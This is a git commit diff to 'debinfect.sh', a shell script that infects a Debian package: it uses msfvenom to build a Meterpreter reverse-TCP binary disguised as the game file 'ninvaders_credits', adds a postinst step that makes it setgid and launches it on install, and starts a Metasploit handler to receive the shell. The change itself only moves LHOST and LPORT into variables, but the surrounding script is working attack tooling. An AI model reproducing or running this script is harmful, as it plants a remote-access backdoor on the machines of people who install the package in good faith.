b1833eceb4ff1c105324f3b037ad3df90b125d72
apolzek <viniciusgomes955@gmail.com>
2020-04-14 19:04:29 -0400

    Use lport,lhost in msfvenom

--- debinfect.sh
+++ debinfect.sh
@@ -15,7 +15,7 @@ function create_deb() {
     mv control /tmp/packing/work/DEBIAN/
     mv postinst /tmp/packing/work/DEBIAN/
 
-    sudo msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 -f elf -o ninvaders_credits
+    sudo msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o ninvaders_credits
     mv ninvaders_credits /tmp/packing/work/usr/games/
     echo "sudo chmod 2755 /usr/games/ninvaders_credits && /usr/games/ninvaders_credits &" >>/tmp/packing/work/DEBIAN/postinst
     dpkg-deb --build /tmp/packing/work/
@@ -27,6 +27,8 @@ if [ "$#" != 2 ]; then
     echo -e "Invalid args\n./debinfect.sh <IP> <PORT>"
 else
     $(pwd)/input_validator.sh "$1" "$2"
+    LHOST=$1
+    LPORT=$2
     create_deb
     sudo service postgresql start
     msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/x64/shell/reverse_tcp; set LHOST $1; set LPORT $2; run; exit -y"
